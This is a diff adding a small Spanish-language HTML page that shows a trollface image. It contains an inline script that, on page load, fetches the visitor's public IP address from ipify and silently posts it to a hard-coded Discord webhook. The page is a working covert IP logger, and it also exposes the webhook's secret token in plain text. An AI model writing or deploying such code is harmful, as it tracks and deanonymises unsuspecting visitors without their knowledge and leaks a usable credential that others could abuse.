@@ -1,0 +1,53 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ASD</title>
+</head>
+<body>
+    <h1>TEST</h1>
+
+  
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRY7OOhDZDaP6YS-tOd1A0ArdgqOVAmQteIkQ&s" alt="Trollface" style="width: 300px; height: auto;">
+
+    <script>
+
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+
+                const userIP = data.ip;
+                console.log("La IP pública es: ", userIP);
+
+                const discordWebhookURL = 'https://discord.com/api/webhooks/1348475401864740915/JiqX9cSNImPOG2JaXduAzN7WLpY0mBOorfK_orr41AmGsonxO9SK-SE1OBUzaqMuXfa4';
+
+                const payload = {
+                    content: `¡Alguien visitó tu página! La IP es: ${userIP}`
+                };
+
+                fetch(discordWebhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("IP enviada correctamente a Discord.");
+                    } else {
+                        console.error("Hubo un error al enviar la IP.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error al enviar la IP a Discord: ", error);
+                });
+            })
+            .catch(error => {
+                console.error("Error al obtener la IP pública: ", error);
+            });
+    </script>
+</body>
+</html>
